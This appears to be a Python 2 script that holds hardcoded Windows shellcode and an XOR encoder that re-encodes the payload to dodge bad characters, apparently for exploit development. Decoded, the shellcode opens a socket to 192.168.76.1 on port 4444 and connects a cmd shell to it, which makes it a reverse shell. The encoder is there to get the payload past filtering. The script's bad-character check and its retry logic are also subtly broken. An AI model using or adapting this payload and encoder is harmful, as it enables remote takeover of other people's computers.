#!/bin/python 
from random import randint

#shellcode 
shellcode = ("\x31\xC0\x66\xB8\x33\x32\x50\x68\x77\x73\x32\x5F\x54\xBB\xDC\x94\xDF\x76\xFF\xD3\x89\xC5\x31\xC0\x66\xB8\x75\x70\x50\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x55\xBB\x3B\x90\xE1\x76\xFF\xD3\x31\xDB\x66\xBB\x90\x01\x29\xDC\x54\x31\xC9\x66\xB9\x02\x02\x51\xFF\xD0\x31\xC0\x66\xB8\x74\x41\x50\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x55\xBB\x3B\x90\xE1\x76\xFF\xD3\x31\xDB\x53\x53\x53\x31\xC9\xB1\x06\x51\x43\x53\x43\x53\xFF\xD0\x50\x5F\x31\xC0\xB8\x90\x65\x63\x74\xC1\xE8\x08\x50\x68\x63\x6F\x6E\x6E\x54\x55\xBB\x3B\x90\xE1\x76\xFF\xD3\x68\xC0\xA8\x4C\x01\x66\x68\x11\x5C\x31\xDB\xB3\x02\x66\x53\x89\xE2\x6A\x10\x52\x57\xFF\xD0\xBB\x90\x63\x6D\x64\xC1\xEB\x08\x53\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\xC6\x44\x24\x10\x44\x8D\x44\x24\x10\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\xBB\x28\x1C\xDD\x76\xFF\xD3\x31\xC0\x50\xB8\xD8\x41\xE1\x76\xFF\xD0")

bad_chars = ["\x00\x0f\x14\x15\x2f\x3b\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa8\xa9\xad\xae\xb3\xb4\xb8\xb9\xbe\xc0\xc1\xc2\xc3\xc8\xca\xcb\xcc\xcd\xce\xcf\xd0\xd2\xd3\xd4\xd5\xd7\xd8\xd9\xda\xdb\xdd\xde\xe3\xf0\xf5\xf8\xfd\xfe"]
shellcode_ = bytearray()
shellcode_.extend(shellcode)

len_shellcode = len(shellcode_)
if len_shellcode % 2  == 1:  # checking if shellcode is aligned 
	shellcode_.append("\x90")


def encoder():
	encode_shellcode = bytearray()
	for i in range (0,len_shellcode,2):
		x = randint(1,255)	
		byte1 = shellcode_[i]
		byte2 = shellcode_[i+1]
		#XOR 
		byte1 = ( x ^ byte1 ) 
		byte2 = ( byte1 ^ byte2 )
		encode_shellcode.append(x)
		encode_shellcode.append(byte1)
		encode_shellcode.append(byte2)

	for i in bad_chars: #checking for bad chars 
		if encode_shellcode.find(i) >= 0 :
	#bad char found
			print "Illegal Char found , re-encoding wait :) "
			encoder()
	return encode_shellcode #Return the encoded shellcode


encoded_ = "" 
encoded_shellcode = encoder()
for y in encoded_shellcode:
	len_enc = len(str(hex(y)))
	if len_enc == 3 :
		encoded_+=str(hex(y)[:2])+"0"+str(hex(y)[2:])+","

	else:
		encoded_+=str(hex(y))+","

encoded_=encoded_[:-1]
print "Size of original shellcode is "+str(len(shellcode_))
print "Size of encoded shellcode is "+str(len(encoded_shellcode))
print "\n"
# print encoded_		
encoded_ = encoded_.replace(',','')	
print 'shellcode = "%s"' % encoded_.replace('0x','\\x')
print "\n"	